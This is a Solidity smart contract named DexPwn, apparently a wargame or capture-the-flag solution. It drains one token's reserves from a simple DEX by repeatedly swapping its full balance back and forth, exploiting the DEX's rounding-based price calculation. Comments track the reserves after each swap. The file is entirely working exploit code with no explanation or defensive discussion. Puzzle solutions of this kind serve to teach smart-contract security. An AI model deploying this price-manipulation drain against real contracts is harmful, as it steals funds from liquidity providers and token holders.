//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// 0xE47B530055d06C3eE0b8E23b5bd495b9D8A7a08E

interface IDex {

    function token1() external returns(address);
    function token2() external returns(address);
    function swap(address from, address to, uint amount) external;
    function approve(address spender, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint); 
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract DexPwn {

    IDex dex;
    IERC20 public token1;
    IERC20 public token2;

    constructor(IDex _dex) {
        dex = _dex;   
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function pwn() public {
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);
        dex.approve(address(dex), 1000);
                                     //T1 - T2  (reserves in exchange) 
        _swap(token1, token2);      //110- 90
        _swap(token2, token1);      //86-  110
        _swap(token1, token2);      //110- 80
        _swap(token2, token1);      //69-  110
        _swap(token1, token2);      //110- 45

        dex.swap(address(token2), address(token1), 45); 

        require(token1.balanceOf(address(dex)) == 0, "Token 1 Dex Reserves != 0");     
      
    }

    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
        dex.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this)));
    }

}